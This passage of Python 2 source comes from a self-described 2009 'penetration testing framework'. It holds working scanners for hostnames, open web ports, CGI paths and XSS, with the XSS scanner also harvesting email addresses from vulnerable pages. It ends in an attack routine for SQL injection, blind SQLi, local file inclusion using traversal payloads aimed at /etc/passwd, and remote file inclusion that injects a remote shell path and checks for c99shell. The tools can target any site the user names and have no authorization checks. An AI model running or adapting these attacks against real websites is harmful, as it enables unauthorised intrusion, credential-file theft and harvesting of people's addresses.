			for ip in lst:
				for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
					iplist.append(ip+str(i))
			return iplist
		if len(ip_range[1].split("-",1)) ==1:
			for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
				iplist.append(ip_range[0]+"."+str(ip_range[1].split("-",1)[0])+"."+str(i))
			return iplist
			
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEB SERVER HOSTNAME IDENTYFIER            #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2':
			hlpserver()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			ashu=raw_input("\n\tEnter The IP Range Here : ")	
			iplist = getips(ashu)
			print "\n[+] Range Loaded:",len(iplist),"\n"
			num = 0
			for ip in iplist:
				try:
					hn = socket.gethostbyaddr(ip)[0]
					print "HostIP:",ip
					print "HostName:",hn
					num +=1
				except(socket.herror):
					pass
			print "\n[+] Found",num,"possible subdomain(s) for ip range",ashu,"\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")

def websevye():

	import socket, httplib, threading, time, sys

	def scan(ip, msg):
		ports = [80,8000,8080]
		for port in ports:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip, port))
				s.close()
				print "[+] Open:",ip+":"+str(port)
				servtest(ip, port)
			except:
				pass
	
	
	def getips(ip_range):
		
		lst = []
		iplist = []
		ip_range = ip_range.rsplit(".",2)
		if len(ip_range[1].split("-",1)) ==2:
			for i in range(int(ip_range[1].split("-",1)[0]),int(ip_range[1].split("-",1)[1])+1,1):
				lst.append(ip_range[0]+"."+str(i)+".")
			for ip in lst:
				for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
					iplist.append(ip+str(i))
			return iplist
		if len(ip_range[1].split("-",1)) ==1:
			for i in range(int(ip_range[2].split("-",1)[0]),int(ip_range[2].split("-",1)[1])+1,1):
				iplist.append(ip_range[0]+"."+str(ip_range[1].split("-",1)[0])+"."+str(i))
			return iplist
	
		
	def servtest(ip, port):
		
		try:
			h = httplib.HTTP(ip+":"+str(port))
			h.putrequest("HEAD", "/")
			h.putheader("Host", ip)
			h.endheaders()
			status, reason, headers = h.getreply()
			server = headers.get("Server")
			if server:
				print "[+] Running:",server,"\n"
		except: pass
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEB SERVER SERVICE ENUMERATION            #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2':
			hlpserverservi()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			ashu=raw_input("\n\tEnter The Ip Range Here : ")
			try:
				iplist = getips(ashu)
			except(ValueError):
				print "[-] Incorrect IP-Range\n"
				sys.exit(1)
			print "\n[+] Scanning:",len(iplist),"ips\n"
			socket.setdefaulttimeout(3)
			for ip in iplist:
				time.sleep(1)
				threading.Thread( target=scan, args=(ip, 0) ).start()
			sending_back_to_Vilage=raw_input("\n")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
	


def cgiscan():

	import sys, httplib, time, socket
	global anony
	def main(path):
	
		if path[0] == "/":
			path = path[1:]
		
		if proxy != 0:
			h = httplib.HTTP(proxy)
			h.putrequest("GET", "http://"+host+path)
		else:
			h = httplib.HTTP(host[:-1])
			h.putrequest("HEAD", "/"+path)
		h.putheader("Host", host)
		h.endheaders()
		okresp, reason, headers = h.getreply()
		return okresp, reason, headers.get("Server")
		
	def timer():
		now = time.localtime(time.time())
		return time.asctime(now)
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  CGI+LOGIC SCANNAR                         #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2':
			hlpcgi()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			socket.setdefaulttimeout(15)
			ashu=raw_input("Enter The Website Name Here : ")
			salu=raw_input("Enter The Port Website Port No Here : ")
			kulu=raw_input("Enter The File Name Where You Want To Save The Risult : ")	
			host = ashu
			port = salu
			ashikalim= 'cgilist'

			try:
				lines = open(ashikalim, "r").readlines() #vulerable list, change path/name if necessary
			except(IOError): 
			 	print "[-] Error: Check your paths_file location.\n" 
				sys.exit(1)
			file = kulu
			proxy = anony
			verbose = 1
			host = host.replace("http://","")
			if host.count("/") >= 1:
				host = host.rsplit("/",1)[0]
			if host[-1:] != "/":
				host =  host+"/"	
		
			try:
				okresp = main(" ")[:1]
			except(socket.timeout):
				print "\n[-] Timed Out"
				print "[-] Try new proxy or different host\n"
				sys.exit(1)
			except(socket.gaierror), error:
				print "\nError:",error
				print "\n[-] Check your host\n"
				sys.exit(1)
			
			badresp,reason,server = main("/ashikali.html")
			
			if okresp[0] == badresp:
				print "\n[-] Responses matched, try another host."
				print "[-] Responses:",okresp[0], badresp,"\n"
				sys.exit(1)
			else:
				print "\n[+] Target host:",host
				print "[+] Target port:",port
				print "[+] Target server:",server
				print "[+] Paths Loaded:",len(lines)
				try:
					if file:
						output_file = open(file, "a")
						print "[+] Output File:",file
				except(NameError):
					output_file = None
					pass
				pass
				print "[+] Target OK response:",okresp[0]
				print "[+] Target BAD response:",badresp, reason
				print "[+] Scan Started at",timer()
				print "-"*55
				time.sleep(3)
			
			found_vuln = []
			for line in lines:
				if verbose == 1:
					print "\n[-] Left:",len(lines)
				try: 
					time.sleep(1)
					response, reason = main(line.strip("\n"))[:2]
					if verbose == 1:
						print "\n[+] Trying:",line,"   Got:",response, reason
					if response == okresp[0]:
						found_vuln.append(host+line)
						print "\n\t[+]",response,reason,":",host+line
					if response == int(401):
						print "\n\t[-]",response,reason,":",host+line,"\tNeeds Authorization"
				except(AttributeError, TypeError): 
					pass
				lines.remove(line)
			
			if len(found_vuln) == 0:
				print "\n[-] Couldn't find anything.\n"
			else:
				print "-"*55
				print "\n[+] Found",len(found_vuln),"possible vulnerabilities, check manually."
				for x in found_vuln:
					if output_file != None:
						output_file.writelines("[+]"+x+"\n")
					print "\n[!] ",x
			print "\n[-] Scan completed at",timer(),"\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")
			
		
def xssi():

	#!/usr/bin/python

	import sys, urllib2, re, sets, random, httplib, time, socket

	global xss_payloads,alert

	def StripTags(text):
	     finished = 0
	     while not finished:
	         finished = 1
	         start = text.find("<")
	         if start >= 0:
	             stop = text[start:].find(">")
	             if stop >= 0:
	                 text = text[:start] + text[start+stop+1:]
	                 finished = 0
	     return text
	
	def timer():
		now = time.localtime(time.time())
		return time.asctime(now)


	def getemails(site):

		try:
			if site.split("/",1)[0] not in done:
				print "\t[+] Collecting Emails:",site.split("/",1)[0]
				webpage = urllib2.urlopen(proto+"://"+site.split("/",1)[0], port).read()
				emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
				done.append(site.split("/",1)[0])
				if emails:
					return emails
		except(KeyboardInterrupt):
			print "\n[-] Cancelled -",timer(),"\n"
			sys.exit(1)
		except(IndexError):
			pass
		
	def getvar(site):
		
		names = []
		actions = []
		print "\n","-"*45
		print "[+] Searching:",site
		try:
			webpage = urllib2.urlopen(proto+"://"+site, port).read()
			emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
			var = re.findall("\?[\w\.\-/]*\=",webpage)
			if len(var) >=1:
				var = list(sets.Set(var))
			found_action = re.findall("action=\"[\w\.\-/]*\"", webpage.lower())
			found_action = list(sets.Set(found_action))
			if len(found_action) >= 1:
				for a in found_action:
					a = a.split('"',2)[1]
					try:
						if a[0] != "/":
							a = "/"+a
					except(IndexError):
							pass
					actions.append(a)
			found_names = re.findall("name=\"[\w\.\-/]*\"", webpage.lower())
			found_names = list(sets.Set(found_names))
			for n in found_names:
				names.append(n.split('"',2)[1])
			print "[+] Variables:",len(var),"| Actions:",len(actions),"| Fields:",len(names)
			print "[+] Avg Requests:",(len(var)+len(names)+(len(actions)*len(names))+(len(actions)*len(names)))*len(xss_payloads)
			if len(var) >= 1:
				for v in var:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							for xss in xss_payloads:
								tester(site.rsplit('/',x+1)[0]+"/"+v+xss)
					for xss in xss_payloads:
						tester(site+"/"+v+xss)
			
			if len(names) >= 1:
				for n in names:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							for xss in xss_payloads:
								tester(site.rsplit('/',x+1)[0]+"/"+"?"+n+"="+xss)
					for xss in xss_payloads:
						tester(site+"/"+"?"+n+"="+xss)
			
			if len(actions) != 0 and len(names) >= 1:
				for a in actions:
					for n in names:
						if site.count("/") >= 2:
							for x in xrange(site.count("/")):
								for xss in xss_payloads:
									tester(site.rsplit('/',x+1)[0]+a+"?"+n+"="+xss)
						#tester(site.split("/")[0]+a+"?"+n+"="+xss)
				
			if len(actions) != 0 and len(var) >= 1:
				for a in actions:
					for v in var:
						if site.count("/") >= 2:
							for x in xrange(site.count("/")):
								for xss in xss_payloads:
									tester(site.rsplit('/',x+1)[0]+a+v+xss)
						else:
							for xss in xss_payloads:
								tester(site.split("/")[0]+a+v+xss)	
			
		
		except(socket.timeout, IOError, ValueError, socket.error, socket.gaierror):
			
			pass
		except(KeyboardInterrupt):
			print "\n[-] Cancelled -",timer(),"\n"
			sys.exit(1)
				
	def tester(target):
	
		if verbose ==1:
			if message != "":
				print "Target:",target.replace(alert ,message)
			else:
				print "Target:",target
		
		try:
			source = urllib2.urlopen(proto+"://"+target, port).read()
			h = httplib.HTTPConnection(target.split('/')[0], int(port))
			try:
				h.request("GET", "/"+target.split('/',1)[1])
			except(IndexError):
				h.request("GET", "/")
			r1 = h.getresponse()
			if verbose ==1:
				print "\t[+] Response:",r1.status, r1.reason
			if re.search(alert.replace("%2D","-"), source) != None and r1.status not in range(303, 418):
				if target not in found_xss:
					if message != "":
						print "\n[!] XSS FOUND:", target.replace(alert ,message)
					else:
						print "\n[!] XSS FOUND AT:", target
					print "\t[+] Response:",r1.status, r1.reason
					emails = getemails(target)
					if emails:
						print "\t[+] Email:",len(emails),"addresses\n"
						found_xss.setdefault(target, list(sets.Set(emails)))
					else:
						found_xss[target] = "None"
		except(socket.timeout, socket.gaierror, socket.error, IOError, ValueError, httplib.BadStatusLine, httplib.IncompleteRead, httplib.InvalidURL):
			pass
		except(KeyboardInterrupt):
			print "\n[-] Cancelled -",timer(),"\n"
			sys.exit(1)
		except():
			pass
					
	
 
	site = raw_input("\nEnter The Website Here : ")
	port = raw_input("\nEnter The Port Here : ")
	verbose = 1
	txt ='xssscanningreport.txt' 
	al='XSS FOUND'
	message = re.sub("\s","%2D",al)
	socket.setdefaulttimeout(10)
	found_xss = {}
	done = []
	count = 0
	proto = "http"
	alert = "ashikali%2D1208%2DY0U"
	print "\n[+] XSS_scan Loaded"
	print "[+] Verbose Mode On"
	print "[+] Alert:",message
	print "[+] File:",txt
	print "[+] XSS Payloads:",len(xss_payloads)
	print "[+] Site:",site
	print "[+] Port:",port
	if site[:7] == "http://":
		site = site.replace("http://","")
	if site[:8] == "https://":
		proto = "https"
		if port == "80":
			print "[!] Using port 80 with https? (443)"
		site = site.replace("https://","")
	print "[+] Started:",timer()
	print "\n[-] Cancel: Press Ctrl-C"
	time.sleep(4)
	getvar(site)
	
	print "-"*65
	print "\n\n[+] Potential XSS found:",len(found_xss),"\n"
	time.sleep(3)
	if txt != None and len(found_xss) >=1:
		xss_file = open(txt, "a")
		xss_file.writelines("\n\t\t#################################################\n")
		xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #\n") 
		xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
		xss_file.writelines("\t\t#    xss SCANNING                               #\n")
		xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
		xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
		xss_file.writelines("\t\t#    GNU General Public License                 #\n")
		xss_file.writelines("\t\t#################################################\n")
		xss_file.writelines("\t\t            ALL LINKS ARE VULNARABLE BY XSS \n")
		xss_file.writelines("\t\t----------------------------------------------------\n\n")
		print "[+] Writing Data:",txt
	else:
		print "[-] No data written to disk"
	for k in found_xss.keys():
		count+=1
		if txt != None:
			if message != "":
				xss_file.writelines("["+str(count)+"] "+k.replace(alert ,message)+"\n")
			else:
				xss_file.writelines("["+str(count)+"] "+k+"\n")
		if message != "":
			print "\n["+str(count)+"]",k.replace(alert ,message)
		else:
			print "\n["+str(count)+"]",k
		addrs = found_xss[k]
		if addrs != "None":
			print "\t[+] Email addresses:" 
			for addr in addrs: 
				if txt != None:
					xss_file.writelines("\tEmail: "+addr+"\n")
				print "\t   -",addr
	print "\n[-] Done -",timer(),"\n"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

	
	
def anonymise():
	import sys, httplib, socket
		
	global an, pls, anony
	an=raw_input("\n\n\n\n\tEnter The Proxy Address Here : ")
	pls=raw_input("\n\tEnter The Port Here : ")
	anony = str(an) + ':' +str(pls)
	try:
		if an:
			print "\n\t[+] Testing Proxy..."
			h2 = httplib.HTTPConnection(anony)
			h2.connect()
			print "\n\t\t[-] Proxy:",anony,"Sucsessfully Loded"
	except(socket.timeout):
		print "\n\t\t[-] Proxy Timed Out"
		anony = 0
		pass
	except:
		print "\n\t\t[-] Proxy Failed"
		anony = 0
		pass
	abcr =raw_input("\n\n\t Process Done Please Press Any key To Go Back In Previous Menu...")

def sqlin():
	#!/usr/bin/python


	import urllib,sys,os,sgmllib 
	global jense
	rfi=""
	mode= ''
	myroot="root:x:"
	anjing="c99shell"
	cekrfi=''
	lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
	pathdisclosure1="/home/"
	pathdisclosure2="/var/"
	pathdisclosure3="/www/"
	pathdisclosure4="/html/"
	pathdisclosure5="/usr/"
	pathdisclosure6="/user/"
	pathdisclosure7="/sites/"
	pathdisclosure8="/mnt"
	pathdisclosure9="/etc/"
	pathdisclosure10="/web/"
	penghubung=" in "
	gajebo="failed to open"
	l2="http://www.googlebig.com/"
	cachesqli="-"
	cacheblind1="-"
	cacheblind100="-"
	log = "webscan.txt"
	tanya="?"
	samadengan="="
	appname = os.path.basename(sys.argv[0]) 
	ceksqli="'"
	slash="/"
	cekblind1="+order+by+1--"
	cekblind100="+order+by+300--"
	mysqli1="You have an error in your SQL"
	mysqli2="Division by zero in"
	mysqli3="supplied argument is not a valid MySQL result resource in"
	mysqli4="Call to a member function"
	accesqli1="Microsoft JET Database"
	accesqli2="ODBC Microsoft Access Driver"
	mssqli1="Microsoft OLE DB Provider for SQL Server"
	mssqli2="Unclosed quotation mark"
	oracle="Microsoft OLE DB Provider for Oracle"
	mscfm="[Macromedia][SQLServer JDBC Driver][SQLServer]Incorrect"
	general="Incorrect syntax near"
	mywisdom="http://"
	sat_ahyar="=1"
	sat_ahyar=str(sat_ahyar)
	class MyParser(sgmllib.SGMLParser): 
	    "A simple parser class." 
 
 	    def parse(self, s): 
 	       	"Parse the given string 's'." 
 	       	self.feed(s) 
 	       	self.close() 
 
	    def __init__(self, verbose=0): 
	        "Initialise an object, passing 'verbose' to the superclass." 
	 
	        sgmllib.SGMLParser.__init__(self, verbose) 
	        self.hyperlinks = [] 
 
	    def start_a(self, attributes): 
	        "Process a hyperlink and its 'attributes'." 
	 
	        for name, value in attributes: 
	            if name == "href": 
	                self.hyperlinks.append(value) 
	            if name == "src": 
	                self.hyperlinks.append(value) 
 
	    def get_hyperlinks(self): 
	        "Return the list of hyperlinks." 
 
	        return self.hyperlinks 
 
	cho='1'
	while (cho != '3'):
		
		if jense == '2':
			bansql()	
		elif jense == '3':
			banbli()	
		elif jense == '4':
			banlfi()	
		elif jense == '5':
			banrfi()	
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2':
				
			if jense == '2':
				hlpsqli()	
			elif jense == '3':
				hlpblind()	
			elif jense == '4':
				hlplfi()	
			elif jense == '5':
				hlprfi()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			zero= raw_input("\n\tEnter Your Site Name Here : ") 
			site = zero.replace("http://","") 
			site = "http://" + site.lower() 
			if jense == '2':
				mode = "-sqli"
			elif jense == '3':
				mode = "-blind"
			elif jense == '4':
				mode = "-lfi"
			elif jense == '5':
				cekrfi= raw_input("\n\tEnter The Shell Path : ")
				print "\n\n"
				mode = "-rfi"
			else:
				exit
			try: 
			    site_data = urllib.urlopen(site) 
			    parser = MyParser() 
			    parser.parse(site_data.read()) 
			except(IOError),msg: 
			    print "Error in connecting site ", site 
			    print msg 
			    sys.exit(1) 
			links = parser.get_hyperlinks() 
			print "If Web Identify Sucsessfully Its Will logged at webscan.txt you May check the log after scanning finished"
			print "Woot Woot Massage will Idntify That Web Is Vulnarable"
			l2=site	
			urlbuta=site+slash
			url_rfi_basic=site+slash
			url_lfi_basic=site+slash
			z=0
			data=""
			x=0
			for l in links: 
				z=z+1
				if z>50:
					sys.exit(1)
			        if mode=='-sqli':
					z=z+1
			         	if z>50:
				        	sys.exit(1)
					htmlsqli=""
					nemu="no"
					tipe=""
				         
					if samadengan in l and tanya in l:
						if mywisdom not in l:
			        		       l2=l+ceksqli
			    		               if site not in l2:
							        l2=site+slash+l2
			                       
		        	                else :
						       if site in l:
							       l2=l+ceksqli
					        print "[-]Checking sqli at:"+l2     
					        response=urllib.urlopen(l2)
		                	        htmlsqli = response.read()   
						
					if mysqli1 in htmlsqli:
						nemu="yes"
						tipe="mysql injection"
				        elif mysqli2 in htmlsqli:
					       	nemu="yes"
						tipe="mysql injection"
					elif mysqli3 in htmlsqli:
					       	nemu="yes"
						tipe="mysql injection (error fetching array)"
					elif mysqli4 in htmlsqli:
					       	nemu="yes"
						tipe="oop application bug"
				 
					elif accesqli1 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
			        	
					elif accesqli2 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
				        	
					elif mssqli1 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
			        	
					elif mssqli2 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
			        	
					elif oracle in htmlsqli:
						nemu="yes"
						tipe="oracle sql injection"
			        	
					elif mscfm in htmlsqli:
						nemu="yes"
						tipe="cfm mssql injection"
		        	
					elif general in htmlsqli:
						nemu="yes"
						tipe="unidentified sql injection"
			        	
					if nemu=='yes':
						print "[+]W00t !! Found "+ tipe+ " Bug at:"+l2
						print "[+]Possible server's hole saved at webscan.txt"
						filelog = open(log, "a")
						filelog.write ("\n[+]W00t !! Found "+ tipe+ " Bug at:"+l2) 
			                #tes path disclosure
					tahap2=l2.split('=')
					lx=tahap2[0]+sat_ahyar+ceksqli
					if tanya in lx and z<3:
					  print "[--]checking error request at:"+lx
					  response=urllib.urlopen(lx)
					  htmlsqli = response.read()   
				
					  if mysqli1 in htmlsqli:
						nemu="yes"
						tipe="mysql injection"
				          elif mysqli2 in htmlsqli:
					       	nemu="yes"
						tipe="mysql injection"
		        	
				  	  elif accesqli1 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
			        	
					  elif accesqli2 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
		        	
					  elif mssqli1 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
			        	
					  elif mssqli2 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
		        	
					  elif oracle in htmlsqli:
						nemu="yes"
						tipe="oracle sql injection"
	        	
					  elif mscfm in htmlsqli:
						nemu="yes"
						tipe="cfm mssql injection"
		        	
					  elif general in htmlsqli:
						nemu="yes"
						tipe="unidentified sql injection"
		        
					  elif gajebo in htmlsqli:
						nemu="yes"
						tipe="unidentified error message"
		        
					  elif pathdisclosure1 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path discosure /home/"
					  elif pathdisclosure2 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /var/"
					  elif pathdisclosure3 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /www/"
					  elif pathdisclosure4 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /html/"
					  elif pathdisclosure5 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /usr/"
					  elif pathdisclosure6 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /user/"
					  elif pathdisclosure7 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /sites/"
					  elif pathdisclosure8 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /mnt/"
					  elif pathdisclosure9 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /etc/"
					  elif pathdisclosure10 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /web/"
			
		
	        	
					  if nemu=='yes':
						print "[+]W00t !! Found "+ tipe+ " Bug at:"+lx
						print "[+]Possible server's hole saved at webscan.txt"
						filelog = open(log, "a")
						filelog.write ("\n[+]W00t !! Found "+ tipe+ " Bug at:"+lx) 
			
		
				elif mode=='-blind':
					z=z+1
        			 	if z>50:
		     	   			sys.exit(1)
					nemu="no"
					l1=urlbuta
					l100=urlbuta
					if samadengan in l:
						if mywisdom not in l:
				        	       l1=l+cekblind1
					               if site not in l1:
							        l1=site+slash+l1
						       l100=l+cekblind100
					               if site not in l100:
							        l100=site+slash+l100
		        	                else :
						       if site in l:
							       l1=l+cekblind1
							       l100=l+cekblind100
					        print "[-]Saving response length for blind sqli at :"+l1     
				        	response=urllib.urlopen(l1)
                		        	cacheblind1 = response.read()
				        	print "[-]Saving response length for blind sqli at :"+l100     
				        	response=urllib.urlopen(l100)
        		                	cacheblind100 = response.read()
						panjangblind1=len(cacheblind1)
						panjangblind100=len(cacheblind100)
						if panjangblind1!=panjangblind100:
							print "[+]W00t !! Found Possible Blind sqli Bug at:"+l100
							print "[+]Possible server's hole saved at webscan.txt"
							filelog = open(log, "a")
						        filelog.write ("\n[+]W00t !! Found Possible Blind sqli Bug at:"+l100) 
						else:
							print "[-]Sorry no possible blind found here !"
		   	
		   
		   
		   
				elif mode=='-lfi':
				      z=z+1
				      if z>50:
		        			sys.exit(1)
	              		      for ceklfi in lfis:  
	                 		htmllfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
			 
			 		if samadengan in l:
        	         		   	if mywisdom not in l:
						       beforelfi=l.split('=')
						       pj=len(beforelfi)
        	                		       da=0
        	                		       kont=""
						       for x in beforelfi:
							    da=da+1
               	                       			    if da<pj:
	       	                       				kont=kont+x+"="	
	
					               lfi=kont+ceklfi
					               if site not in lfi:
							        lfi=site+slash+lfi
			                       
                	        		else :
						       if site in l:
					           
					          
					       			beforelfi=l.split('=')
				               			pj=len(beforelfi)
                        	               			da=0
                        	               			kont=""
				               			for x in beforelfi:
                        	                	   		da=da+1
                        	                	   		if da<pj:
					         	   			kont=kont+x+"="
					       			lfi=kont+ceklfi
				        	if lfi!="":
		        			   print "[-]Checking lfi at:"+lfi     
		        	   		try:
				   		   response=urllib.urlopen(lfi)
				      		   htmllfi = response.read()   
				   		except(IOError),msg: 
                        	   		   print "Error in testing url: ", lfi
                        	   		   print msg 
						if myroot in htmllfi:
				      				print "[+]W00t !! Found lfi Bug at:"+lfi
		                 				print "[+]Possible server's hole saved at webscan.txt"
				                		filelog = open(log, "a")
								filelog.write ("\n[+]W00t !! Found lfi Bug at:"+lfi) 
					if samadengan in l:
							if mywisdom not in l:
			               				lfi=l
			              				if site not in lfi:
					        			lfi=site+slash+lfi
			                       
                	        			else :
				        			if site in l:
					       				lfi=l
					       
		        				tahap3=lfi.split('=')
							lfix=tahap3[0]+samadengan+ceklfi
							if tanya in lfix:
			        	   	   		print "[--]checking lfi at:"+lfix
			    	
	                    			    	try:
							      response=urllib.urlopen(lfix)
							      htmllfi = response.read()   
							except(IOError),msg: 
	                        			      print "Error in testing url: ", lfix
        	                			      print msg 
				      
			        			if myroot in htmllfi:
				      					print "[+]W00t !! Found lfi Bug at:"+lfix
	        	         					print "[+]Possible server's hole saved at webscan.txt"
				 			       	        filelog = open(log, "a")
									filelog.write ("\n[+]W00t !! Found lfi Bug at:"+lfix) 
	        	  		 	
		      	 
				elif mode=='-rfi':
					z=z+1
         				if z>50:
		        			sys.exit(1)
					htmlrfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
					if samadengan in l:
        	            			if mywisdom not in l:
						       beforerfi=l.split('=')
						       pj=len(beforerfi)
		                	               da=0
        		                	       kont=""
					   	       for x in beforerfi:
							    da=da+1
		                               	     	    if da<pj:
			                        	    	kont=kont+x+"="

					               rfi=kont+cekrfi
					               if site not in rfi:
							        rfi=site+slash+rfi
		        	               
			                        else :
						       if site in l:
					           
				          
							       beforerfi=l.split('=')
						               pj=len(beforerfi)
	                        		               da=0
			                                       kont=""
						               for x in beforerfi:
        	                		                   da=da+1
        	                                		   if da<pj:
							         	   kont=kont+x+"="
							       rfi=kont+cekrfi
			        		if rfi!="":
			           			print "[-]Checking rfi at:"+rfi     
			           			try:
				      			   response=urllib.urlopen(rfi)
				      			   htmlrfi = response.read()   
				   			except(IOError),msg: 
		        	                      	   print "Error in testing url: ", rfi
                			              	   print msg 
						if anjing in htmlrfi:
			      					print "[+]W00t !! Found rfi Bug at:"+rfi
		                 				print "[+]Possible server's hole saved at webscan.txt"
				                		filelog = open(log, "a")
								filelog.write ("\n[+]W00t !! Found rfi Bug at:"+rfi) 
			
					if samadengan in l:
						if mywisdom not in l:
			               			rfi=l
			               			if site not in rfi:
					        		rfi=site+slash+rfi
			                       
        	                		else :
				       			if site in l:
					       			rfi=l
					       
					        tahap3=rfi.split('=')
						rfix=tahap3[0]+samadengan+cekrfi
						if tanya in rfix:
					              print "[--]checking rfi at:"+rfix
				    
                			        try:
						      response=urllib.urlopen(rfix)
						      htmlrfi = response.read()   
						except(IOError),msg: 
		                	              print "Error in testing url: ", rfix
		                	              print msg 
						      
					        if anjing in htmlrfi:
						      		print "[+]W00t !! Found rfi Bug at:"+rfix
